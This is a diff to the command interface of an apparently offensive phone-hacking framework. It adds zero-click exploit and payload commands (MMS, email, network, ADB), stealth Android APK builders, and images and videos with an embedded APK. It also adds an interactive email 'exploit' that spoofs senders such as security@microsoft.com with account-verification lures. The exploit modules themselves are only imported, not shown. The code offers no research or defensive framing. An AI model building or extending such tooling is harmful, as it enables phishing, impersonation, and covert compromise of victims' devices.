@@ -55,17 +55,25 @@ def show_commands():
     recon email <address>                    - Scan email address info
     recon username <name>                    - Scan username across platforms
     recon social                             - Auto-scan current target
+    recon app                                - Scan for vulnerable apps/services
+    recon messaging                          - Check SMS/MMS capabilities
+
+  ZERO-CLICK:
+    payload zero-click <mms|email|network|adb> - Generate zero-click payload
+    exploit zero-click <mms|email|network|adb> - Execute zero-click exploit
 
   PAYLOAD:
-    payload apk                              - Generate Android APK
-    payload image                            - Generate image payload
-    payload video                            - Generate video payload
+    payload build-apk                        - Build Android APK (Normal/Stealth)
+    payload compile-apk                      - Compile APK into installable file
+    payload image                            - Generate image with embedded APK
+    payload video                            - Generate video with embedded APK
+    payload apk                              - Generate Android APK (legacy)
     payload web                              - Generate web payload
 
   EXPLOIT:
     exploit ip                               - IP/Network exploit (port scan)
     exploit sms                              - Send SMS exploit
-    exploit email                            - Send email exploit
+    exploit email                            - Interactive email exploit
     exploit social                           - Social media recon on target
     exploit wifi                             - Run WiFi exploit
     exploit bluetooth                        - Run Bluetooth exploit
@@ -86,11 +94,10 @@ def show_commands():
 💡 Examples:
   target add 192.168.1.100 android Phone1
   scan
-  recon email victim@gmail.com
-  exploit social
-  payload apk
+  payload build-apk
+  payload image
   listen start
-  exploit sms
+  exploit email
   status
 """)
 
@@ -161,7 +168,6 @@ def main():
                     value = parts[2]
                     os_type = parts[3] if len(parts) > 3 else 'unknown'
                     
-                    # Determine target type
                     is_ip = True
                     ip_parts = value.split('.')
                     if len(ip_parts) != 4:
@@ -233,7 +239,7 @@ def main():
             
             elif cmd == 'recon':
                 if len(parts) < 3:
-                    print("[-] Usage: recon <phone|email|username|social> [value]")
+                    print("[-] Usage: recon <phone|email|username|social|app|messaging> [value]")
                     continue
                 
                 recon_type = parts[1].lower()
@@ -258,67 +264,232 @@ def main():
                     result = scan(parts[2] if len(parts) > 2 else None)
                     print(json.dumps(result, indent=2))
                 
+                elif recon_type == 'app':
+                    from modules.recon.app_scanner import run
+                    result = run(megalodon.target)
+                    print(json.dumps(result, indent=2))
+                
+                elif recon_type == 'messaging':
+                    from modules.recon.messaging_recon import run
+                    result = run(megalodon.target)
+                    print(json.dumps(result, indent=2))
+                
                 else:
-                    print("[-] Unknown recon type. Use: phone, email, username, social")
+                    print("[-] Unknown recon type. Use: phone, email, username, social, app, messaging")
             
             elif cmd == 'payload':
                 if len(parts) < 2:
-                    print("[-] Usage: payload <apk|image|video|web>")
+                    print("[-] Usage: payload <build-apk|compile-apk|apk|image|video|web|zero-click>")
                     continue
                 
-                if parts[1] == 'apk':
+                if parts[1] == 'build-apk':
+                    from modules.payloads.android_payload_builder import build
+                    result = build()
+                    print(json.dumps(result, indent=2))
+                
+                elif parts[1] == 'compile-apk':
+                    from modules.payloads.apk_compiler import compile_apk
+                    result = compile_apk()
+                    print(json.dumps(result, indent=2))
+                
+                elif parts[1] == 'apk':
                     from modules.payloads.apk_generator import generate
                     result = generate()
                     print(json.dumps(result, indent=2))
+                
                 elif parts[1] == 'image':
                     from modules.payloads.image_payload import generate
                     result = generate()
                     print(json.dumps(result, indent=2))
+                
                 elif parts[1] == 'video':
                     from modules.payloads.video_payload import generate
                     result = generate()
                     print(json.dumps(result, indent=2))
+                
                 elif parts[1] == 'web':
                     from modules.payloads.web_payload import generate
                     result = generate()
                     print(json.dumps(result, indent=2))
+                
+                elif parts[1] == 'zero-click':
+                    if len(parts) < 3:
+                        print("[-] Usage: payload zero-click <mms|email|network|adb>")
+                        continue
+                    
+                    zero_type = parts[2].lower()
+                    print(f"[*] Generating zero-click payload: {zero_type}")
+                    
+                    if zero_type == 'mms':
+                        from modules.zero_click.mms_payload import generate
+                        result = generate()
+                        print(json.dumps(result, indent=2))
+                    elif zero_type == 'email':
+                        from modules.zero_click.email_payload import generate
+                        result = generate()
+                        print(json.dumps(result, indent=2))
+                    elif zero_type == 'network':
+                        from modules.zero_click.network_payload import generate
+                        result = generate()
+                        print(json.dumps(result, indent=2))
+                    elif zero_type == 'adb':
+                        from modules.zero_click.adb_payload import generate
+                        result = generate()
+                        print(json.dumps(result, indent=2))
+                    else:
+                        print("[-] Unknown zero-click payload type. Use: mms, email, network, adb")
+                
                 else:
                     print("[-] Unknown payload command")
             
             elif cmd == 'exploit':
                 if len(parts) < 2:
-                    print("[-] Usage: exploit <ip|sms|email|social|wifi|bluetooth>")
+                    print("[-] Usage: exploit <ip|sms|email|social|wifi|bluetooth|zero-click>")
                     continue
                 
-                method = parts[1]
+                method = parts[1].lower()
                 
                 if method == 'ip':
                     from modules.exploits.ip_exploit import run
                     result = run(megalodon.target)
                     print(json.dumps(result, indent=2))
+                
                 elif method == 'sms':
                     from modules.exploits.sms_exploit import run
                     result = run(megalodon.target)
                     print(json.dumps(result, indent=2))
+                
                 elif method == 'email':
-                    from modules.exploits.email_exploit import run
-                    result = run(megalodon.target)
-                    print(json.dumps(result, indent=2))
+                    if not megalodon.target:
+                        print("[-] No target set. Use: target add <email> email")
+                        continue
+                    
+                    target_email = megalodon.target.get('value')
+                    if '@' not in target_email:
+                        print("[-] Target is not an email address")
+                        continue
+                    
+                    print("\n📧 EMAIL EXPLOIT OPTIONS")
+                    print("=" * 50)
+                    print("1. Standard Email (with spoofing + link/attachment)")
+                    print("2. Zero-Click: Push Notification Exploit (auto-preview)")
+                    print("3. Zero-Click: Normal Opening Exploit (auto-load images)")
+                    print("4. Zero-Click: CVE-Based Exploit (vulnerability)")
+                    print("5. Zero-Click: Calendar Invite Exploit (auto-process)")
+                    print("6. Zero-Click: All Methods Combined")
+                    print("=" * 50)
+                    
+                    choice = input("\nSelect option (1-6): ").strip()
+                    
+                    if choice == '1':
+                        from modules.exploits.email_exploit import run
+                        result = run(megalodon.target)
+                        print(json.dumps(result, indent=2))
+                    
+                    elif choice in ['2', '3', '4', '5', '6']:
+                        from modules.exploits.zero_click_email import run_zero_click
+                        
+                        print("\n📧 CUSTOM EMAIL SETUP")
+                        print("=" * 50)
+                        
+                        print("\n[1] Sender Details:")
+                        sender_name = input("   Enter sender name (e.g., Microsoft Security): ").strip()
+                        if not sender_name:
+                            sender_name = "Security Team"
+                        
+                        sender_email_display = input("   Enter sender email (e.g., security@microsoft.com): ").strip()
+                        if not sender_email_display:
+                            sender_email_display = "security@microsoft.com"
+                        
+                        print("\n[2] Email Subject (IMPORTANT):")
+                        subject = input("   Enter subject: ").strip()
+                        if not subject:
+                            subject = "🔒 Important Security Alert"
+                        
+                        print("\n[3] Email Body:")
+                        print("   (Enter your message. Type 'END' on a new line when done)")
+                        body_lines = []
+                        while True:
+                            line = input("   ")
+                            if line.strip().upper() == 'END':
+                                break
+                            body_lines.append(line)
+                        body = '\n'.join(body_lines) if body_lines else "Please verify your account."
+                        
+                        print("\n" + "=" * 50)
+                        print("📧 EMAIL PREVIEW:")
+                        print(f"From: {sender_name} <{sender_email_display}>")
+                        print(f"To: {target_email}")
+                        print(f"Subject: {subject}")
+                        if len(body) > 200:
+                            print(f"Body:\n{body[:200]}...")
+                        else:
+                            print(f"Body:\n{body}")
+                        print("=" * 50)
+                        
+                        confirm = input("\nSend this email? (y/n): ").lower()
+                        if confirm != 'y':
+                            print("[!] Email cancelled.")
+                            continue
+                        
+                        custom_details = {
+                            'sender_name': sender_name,
+                            'sender_email_display': sender_email_display,
+                            'subject': subject,
+                            'body': body
+                        }
+                        
+                        result = run_zero_click(megalodon.target, int(choice), custom_details)
+                        print(json.dumps(result, indent=2))
+                    
+                    else:
+                        print("[-] Invalid option")
+                
                 elif method == 'social':
                     from modules.recon.social_scanner import run
                     result = run(megalodon.target)
                     print(json.dumps(result, indent=2))
+                
                 elif method == 'wifi':
                     from modules.exploits.wifi_exploit import run
                     result = run()
                     print(json.dumps(result, indent=2))
+                
                 elif method == 'bluetooth':
                     from modules.exploits.bluetooth_exploit import run
                     result = run()
                     print(json.dumps(result, indent=2))
+                
+                elif method == 'zero-click':
+                    if len(parts) < 3:
+                        print("[-] Usage: exploit zero-click <mms|email|network|adb>")
+                        continue
+                    
+                    zero_type = parts[2].lower()
+                    print(f"[*] Running zero-click exploit: {zero_type}")
+                    
+                    if zero_type == 'mms':
+                        from modules.zero_click.mms_exploit import run
+                        result = run(megalodon.target)
+                        print(json.dumps(result, indent=2))
+                    elif zero_type == 'email':
+                        from modules.zero_click.email_exploit import run
+                        result = run(megalodon.target)
+                        print(json.dumps(result, indent=2))
+                    elif zero_type == 'network':
+                        from modules.zero_click.network_exploit import run
+                        result = run(megalodon.target)
+                        print(json.dumps(result, indent=2))
+                    elif zero_type == 'adb':
+                        from modules.zero_click.adb_exploit import run
+                        result = run(megalodon.target)
+                        print(json.dumps(result, indent=2))
+                    else:
+                        print("[-] Unknown zero-click exploit type. Use: mms, email, network, adb")
+                
                 else:
                     print(f"[-] Unknown exploit: {method}")
-                    print("    Available: ip, sms, email, social, wifi, bluetooth")
+                    print("    Available: ip, sms, email, social, wifi, bluetooth, zero-click")
             
             elif cmd == 'screenshot':
                 from modules.post_exploit.screenshot_capture import run
